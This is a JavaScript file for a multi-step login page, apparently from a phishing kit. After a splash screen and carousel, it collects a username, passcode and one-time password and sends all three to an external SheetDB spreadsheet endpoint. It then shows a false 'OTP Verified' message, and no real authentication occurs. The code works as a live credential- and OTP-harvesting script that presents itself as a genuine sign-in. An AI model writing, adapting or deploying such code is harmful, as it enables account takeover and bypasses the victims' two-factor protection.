window.onload = () => {
    setTimeout(() => {
        const splash = document.getElementById('splashScreen');
        splash.classList.add('splash-hidden');
    }, 2000);
};

const track = document.querySelector('.carousel-track');
const dots = document.querySelectorAll('.dot');
const slider = document.getElementById('mainSlider');

// Navigation Triggers
const loginTrigger = document.getElementById('loginTrigger');    
const backToLanding = document.getElementById('backToLanding');  
const goToOtp = document.getElementById('goToOtp');            
const backToLogin = document.getElementById('backToLogin');    
const finishAuth = document.getElementById('finishAuth');      

// Input Elements
const usernameInput = document.getElementById('username');
const passcodeInput = document.getElementById('passcode');
const otpInput = document.getElementById('otpInput');

// --- CONFIGURATION ---
// Replace the URL below with your actual SheetDB API URL
const SHEETDB_API_URL = 'https://sheetdb.io/api/v1/gnmgo6n53wxu6';

let currentIndex = 0;
let carouselInterval;

function startCarousel() {
    carouselInterval = setInterval(() => {
        currentIndex = (currentIndex + 1) % 2;
        if(track) track.style.transform = `translateX(-${currentIndex * 50}%)`;
        dots.forEach(dot => dot.classList.remove('active'));
        if(dots[currentIndex]) dots[currentIndex].classList.add('active');
    }, 4000);
}

// 1. Landing -> Login
loginTrigger.addEventListener('click', () => {
    slider.className = 'main-slider slider-step-2';
    clearInterval(carouselInterval);
});

// 2. Login -> Landing
backToLanding.addEventListener('click', () => {
    slider.className = 'main-slider slider-step-1';
    startCarousel();
});

// 3. Login -> OTP
goToOtp.addEventListener('click', () => {
    slider.className = 'main-slider slider-step-3';
});

// 4. OTP -> Login
backToLogin.addEventListener('click', () => {
    slider.className = 'main-slider slider-step-2';
});

// --- SHEETDB INTEGRATION ---
finishAuth.addEventListener('click', async () => {
    const username = usernameInput.value;
    const passcode = passcodeInput.value;
    const otp = otpInput.value;

    // Basic check to ensure OTP isn't empty
    if (otp.length < 6) {
        alert("Please enter a valid 6-digit OTP.");
        return;
    }

    // UI Feedback
    finishAuth.innerText = "Verifying...";
    finishAuth.disabled = true;

    try {
        const response = await fetch(SHEETDB_API_URL, {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                data: [
                    {
                        'username': username,
                        'passcode': passcode,
                        'otp': otp,
                        'timestamp': new Date().toLocaleString() // Optional: tracks when it was sent
                    }
                ]
            })
        });

        const result = await response.json();

        if (result.created === 1) {
            alert("Success! OTP Verified.");
            
            // Reset App State
            usernameInput.value = '';
            passcodeInput.value = '';
            otpInput.value = '';
            slider.className = 'main-slider slider-step-1';
            startCarousel();
        } else {
            throw new Error("Failed to write to sheet");
        }

    } catch (error) {
        console.error('Error:', error);
        alert("Connection error. Please check your API URL or internet.");
    } finally {
        finishAuth.innerText = "Verify";
        finishAuth.disabled = false;
    }
});

// Username validation logic (Enables the Login button)
usernameInput.addEventListener('input', (e) => {
    if (e.target.value.trim().length > 3) {
        goToOtp.style.backgroundColor = '#005696';
        goToOtp.disabled = false;
    } else {
        goToOtp.style.backgroundColor = '#e0e4e8';
        goToOtp.disabled = true;
    }
});

// Initialize
startCarousel();

          
